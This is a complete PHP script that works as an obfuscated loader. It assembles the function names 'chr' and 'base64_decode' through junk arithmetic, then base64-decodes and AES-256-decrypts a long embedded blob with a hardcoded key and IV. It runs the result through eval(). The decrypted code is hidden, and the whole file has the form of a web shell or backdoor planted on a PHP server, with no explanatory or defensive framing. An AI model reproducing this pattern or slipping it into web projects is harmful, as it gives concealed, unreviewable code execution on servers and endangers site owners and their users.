<?php
function decode_input($c)
{
    $i = array(122 - 8, 111 * 36 - 3892, 99);
    $w = '';
    foreach ($i as $wx) {
        $w .= chr($wx);
    }
    $w = strrev($w);
    return $w($c);
}

$bih = array(98 * 7 / 7 + 9 + 5 - (9 + 5), 97 * 97 / 97 * 97 / 97 * 97 / 97 * 1 / 1, 115 * 23 / 23 * 115 / 115 + 10 + 8 - (10 + 8), 101 - 18 + 18 + 20 - 20 + 18 - 18 - 6 + 6 + 6 - 6, 54 * 3 / 3 * 1 / 1, 52 + 3 - 3 + 8 + 8 - (8 + 8), 95 + 1 + 1 - (1 + 1) + 10 + 9 - (10 + 9) + 9 + 2 - (9 + 2) - 7 + 7, 100 + 2 + 10 - (2 + 10) - 16 + 16 - 18 + 18 + 15 - 15, ((101 - 18 + 18 * 1) / 1 - 15 + 15 + 19 - 19 * 1) / 1, 99 * 33 / 33 * 1 / 1 + 2 + 1 - (2 + 1), 111 * 111 / 111 * 111 / 111 - 19 + 19 + 1 + 7 - (1 + 7) + 2 + 7 - (2 + 7), 100 * 1 / 1 * 100 / 100 * 20 / 20, ((101 - 3 + 3 * 1) / 1 + 16 - 16 * 1) / 1 * 101 / 101);
$kcc = '';
foreach ($bih as $bkj) {
    $kcc .= decode_input($bkj);
}
$uuf = 'W/qhlz2bF/ShnAbzoypDaXayIxZVFLNqtnW6v64wUfOzDHOsYy8QUmno7ttxhcaNKmQFfi6i6cQDan4zbIdalfNK+pJG4ZnVh1hidrAYf8Z0iWKv2DG6nWlvtYcS7qPX1fyV61Sz0EBdxA4PjkG8LMcSXJ+FicRXy1egQeZx1jfZtpmgWzKDmvMaUnMtIFCSteZA4niZMvPtxgQLAbkyMxqeD7fXLpTYC6s+zGLr8Y7BIEVvy+QkuKLSjdKpSSbbjcAu7woP1PitMVWtq6TqL5s1jJrURniqSp15LAg5+JyDZaY7YQyJvJ28j9nNqVeywdXwJJTEN/eiXkQ5RCKXqqAzmUQTJbmaxyOwRh3XiEQQLDWVfMi1GsUeoTNHPkuFbyjdifsihgoUJoMhw63HgVKh0cgaxTUzbM4sn9KRsiv6FwSX+kj6OmG+ph9UeWZojD4UD47YFeJm/wWEu2fFTi+mjiyYtmzb1aRgEbe0fK5iSfLHSYVQN+ANR0/whMZiU16U7UW3keebHehJsaHit3h437GVA4gNdMclugLrKOJgXC3bOhb4dq9TtFMwLfLTDX7pq7TgEG1d312DY8be95LFfuLa/DKCgpeRKH/9OEmcZgdkKCpEeY6BPoavWPgu9AoNqtHfjKOpTCO2WIkX+268oCADKUSukLOWt+C4e7wF+dRlLZtTxn2maqXZikNmgjEGrMh0Hmx6Z8C23m0FRmUvaSY1qRWKifkyPDCf+/EGOC93zZDOVMW60iW45GXUTHNytu/+6KXLuQYpH95i15J0LzzUUm15XmjXsN4ozO6v4lPbOlJ0VS6BJfb1izSJ6ahZHxpARHDPkXP70NQNtA9LaZf5iB60RjIu6dUXlYla9cloQhZqjlQatuBpGT3tKLmXmq3RYr5Hjb9qfs+I5wx6k+5Xo3acComvaJcWsIyEKohROTR7YXmSaiwX2sogrJR+Lqq0QfcYy8YneKivz4uj47r/Jv+65fdWc2JrV5WHfkuGFKK7h3YeEfR6aKN3lv/UzsWzuWfjqs8csdGppog3ob6g9NX4oKk5++/HgB2/bQq83r4ZIbGlDZuK1M4n';
$zdc = '2a+mybbxHa9zIGWQjoaYVfIB7pTfUgGgqXnDEtc3RJw=';
$vxe = '7hfey4mV827KKxb5fkDJmA==';
$chw = openssl_decrypt($kcc($uuf), 'aes-256-cbc', $kcc($zdc), OPENSSL_RAW_DATA, $kcc($vxe));
eval($chw);